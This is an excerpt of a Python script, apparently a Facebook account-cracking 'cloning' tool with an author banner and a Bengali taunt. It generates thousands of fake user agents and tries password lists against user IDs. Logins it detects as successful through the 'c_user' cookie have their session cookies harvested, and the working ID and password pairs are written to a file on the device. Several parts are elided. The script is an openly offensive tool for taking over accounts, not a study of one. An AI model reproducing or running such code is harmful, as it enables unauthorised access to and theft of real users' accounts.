# NAME : NAYEEM
# GITHUB : https://github.com/NAYEEMVAI
...
for ua in range(5000):
	...
	ugen.append(alhaj)
os.system("xdg-openhttps://www.facebook.com/nayeem0988?mibextid=ZbWKwL/")
# LOGO
logo = ("""
  _   _                                 
 | \ | |                                
 ...
 \033[1;91m┃ \033[1;92m┏━━━━━━━━━━>\033[1;96m নাঈম তোদের আব্বু লাগে  \033[1;92m<━━━━━━━━━┓ \033[1;91m1┃
...
def alhaj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[Nayeem ]\033[1;36m😍[%s/%s]😁\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'sec-ch-ua-arch': '""',
    'sec-ch-ua-bitness': '""',
    'sec-ch-ua-full-version': '"114.0esr"',
    ...
    'user-agent': 'Mozilla/5.0 (Android 11; Tablet; rv:114.0esr) Gecko/114.0esr Firefox/114.0esr',
    'x-client-data': 'CO+TywE=',
}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;33m[\033[1;32mNAYEEM OK 😝\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mNAYEEM OK\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/NAYEEM ok.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
